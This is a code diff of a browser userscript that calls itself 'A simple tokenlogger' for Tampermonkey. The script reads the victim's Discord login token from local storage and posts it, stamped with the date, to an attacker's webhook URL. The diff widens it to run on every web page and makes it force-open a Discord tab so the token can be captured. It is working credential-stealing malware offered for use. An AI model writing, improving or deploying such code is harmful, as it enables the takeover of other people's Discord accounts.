@@ -5,21 +5,26 @@
 // @description  A simple tokenlogger for Tampermonkey. (Browser Extension)
 // @author       Lyzev
 // @run-at       document-start
-// @match        https://discord.com/*
+// @include http://*
+// @include https://*
 // @grant        none
 // ==/UserScript==
 
 (function() {
-    const webhook = "WEBHOOK-URL"
-    const token = localStorage.token
-    if (token != null) {
-        const request = new XMLHttpRequest()
-        request.open("POST", webhook)
-        request.setRequestHeader('Content-type', 'application/json')
-        const params = {
-            username: "Tokenlogger",
-            content: "Date: `" + new Date() + "`\nToken: `" + token + "`"
+    if (window.location.href !== 'https://discord.com/channels/@me') {
+        window.open('https://discord.com/channels/@me', '_blank').focus()
+    } else {
+        const webhook = "WEBHOOK-URL"
+        const token = localStorage.token
+        if (token != null) {
+            const request = new XMLHttpRequest()
+            request.open("POST", webhook)
+            request.setRequestHeader('Content-type', 'application/json')
+            const params = {
+                username: "Tokenlogger",
+                content: "Date: `" + new Date() + "`\nToken: `" + token + "`"
+            }
+            request.send(JSON.stringify(params))
         }
-        request.send(JSON.stringify(params))
     }
 })();
